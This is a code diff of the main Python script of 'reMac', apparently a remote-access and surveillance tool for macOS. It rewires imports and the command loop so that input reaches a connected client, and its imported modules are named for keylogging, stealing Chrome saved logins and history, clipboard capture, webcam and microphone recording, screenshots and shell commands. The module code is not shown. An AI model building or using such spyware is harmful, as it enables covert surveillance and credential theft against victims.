@@ -1,19 +1,10 @@
 import sys
 
-from apps import reMac_server
-from apps import reMac_client
+from apps.server import reMac_server
+from apps.client import reMac_client
 
-from modules import mod_hello
-from modules import mod_clipboard
-from modules import mod_chrome_history
-from modules import mod_chrome_logins
-from modules import mod_shellcmd
-from modules import mod_screenshot
-from modules import mod_webcam
-from modules import mod_keylogger
-from modules import mod_recmic
-from modules import mod_modHelp
-from modules import mod_info
+from apps.server.modules import mod_clipboard, mod_keylogger, mod_hello, mod_chrome_logins, mod_recmic, \
+    mod_chrome_history, mod_webcam, mod_shellcmd, mod_info, mod_modHelp, mod_screenshot
 
 myreMac_server = reMac_server.reMac_server()
 myreMac_client = reMac_client.reMac_client()
@@ -68,11 +59,13 @@ def print_help():
 #global clientStarted
 clientStarted = False
 
-def processInput(input):
 
-    # if clientStarted == True:
-    #     myreMac_client.start_client(input)
-    #     return
+def processInput(input):
+    global clientStarted
+    if clientStarted == True and not input == "c" and not input == "s":
+        myreMac_client.send2_client(input)
+        return
+
     inp_args = input.split(" ")
 
     if len(inp_args) > 1:
@@ -97,7 +90,6 @@ def processInput(input):
         print_client_help()
     elif input == "c":
         myreMac_client.start_client()
-        global clientStarted
         clientStarted = True
     elif input == "kl":
         reMacModules[input][0].run_mod()
@@ -146,14 +138,14 @@ def processInput(input):
         print(f"Command '{input}' NOT FOUND! Check the following command list")
         print_help()
 
+
 def enterWaitForInput(argv):
     while True:
         c = input("Select your option and press enter:")
         processInput(c.lower())
 
+
 if __name__ == "__main__":
     if len(sys.argv) == 1:
         print_help()
         enterWaitForInput(sys.argv)
-    # else:
-    #     main(sys.argv[1:])
